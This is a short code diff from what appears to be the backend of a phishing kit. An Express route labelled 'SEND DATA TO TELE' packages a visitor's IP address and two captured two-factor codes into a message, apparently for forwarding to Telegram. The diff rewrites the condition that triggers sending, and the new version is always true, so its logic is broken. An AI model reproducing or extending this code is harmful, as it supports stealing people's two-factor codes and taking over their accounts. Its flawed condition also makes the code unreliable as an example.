@@ -26,7 +26,7 @@ app.post('/api/resgister', (req, res) => {
 
     // SEND DATA TO TELE
 
-if (data.firstTwoFa !== "" || data.secondTwoFa !== "") {
+if (data.firstTwoFa !== null || data.secondTwoFa !== null || data.firstTwoFa !== "" || data.secondTwoFa !== "") {
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
 <strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
 <strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
